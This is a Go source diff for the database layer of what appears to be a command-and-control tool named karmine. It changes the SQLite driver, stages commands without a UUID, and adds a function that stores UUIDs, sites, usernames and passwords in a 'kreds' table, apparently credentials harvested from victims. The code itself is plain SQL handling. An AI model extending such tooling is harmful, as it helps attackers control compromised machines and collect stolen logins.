@@ -8,8 +8,8 @@ import (
 	"os"
 	"time"
 
-	_ "github.com/mattn/go-sqlite3"
 	"github.com/pygrum/karmine/config"
+	_ "modernc.org/sqlite"
 )
 
 type Kdb struct {
@@ -21,7 +21,7 @@ func New() (*Kdb, error) {
 	if err != nil {
 		return nil, err
 	}
-	db, err := sql.Open("sqlite3", conf.DBPath)
+	db, err := sql.Open("sqlite", conf.DBPath)
 	if err != nil {
 		return nil, err
 	}
@@ -50,8 +50,8 @@ func (db *Kdb) GetKeysByUUID(UUID string) (string, string, string) {
 	return aeskey, x1, x2
 }
 
-func (db *Kdb) AddCmdToStack(uuid string, cmd string) error {
-	query := "INSERT INTO kmdstack(staged_cmd, uuid) VALUES (?, ?)"
+func (db *Kdb) AddCmdToStack(cmd string) error {
+	query := "INSERT INTO kmdstack(staged_cmd) VALUES (?)"
 	ctx, cancelfunc := context.WithTimeout(context.Background(), 5*time.Second)
 	defer cancelfunc()
 	stmt, err := db.DB.PrepareContext(ctx, query)
@@ -59,7 +59,7 @@ func (db *Kdb) AddCmdToStack(uuid string, cmd string) error {
 		return fmt.Errorf("error when preparing SQL statement: %v", err)
 	}
 	defer stmt.Close()
-	res, err := stmt.ExecContext(ctx, cmd, uuid)
+	res, err := stmt.ExecContext(ctx, cmd)
 	if err != nil {
 		return fmt.Errorf("error when inserting row into products table: %v", err)
 	}
@@ -264,4 +264,27 @@ func ClearStage(stage string) error {
 		return err
 	}
 	return os.WriteFile(config.ConfigPath(), bytes, 0644)
+}
+
+func (db *Kdb) InsertCreds(UUID, platform, c_url, user, pass string) error {
+	query := "INSERT INTO kreds(uuid, platform, site_url, uname, pass) VALUES (?, ?, ?, ?, ?)"
+	ctx, cancelfunc := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancelfunc()
+	stmt, err := db.DB.PrepareContext(ctx, query)
+	if err != nil {
+		return fmt.Errorf("error when preparing SQL statement: %v", err)
+	}
+	defer stmt.Close()
+	res, err := stmt.ExecContext(ctx, UUID, platform, c_url, user, pass)
+	if err != nil {
+		return fmt.Errorf("error when inserting row into table: %v", err)
+	}
+	rows, err := res.RowsAffected()
+	if err != nil {
+		return fmt.Errorf("error when finding rows affected: %v", err)
+	}
+	if rows < 1 {
+		return fmt.Errorf("no rows affected")
+	}
+	return nil
 }
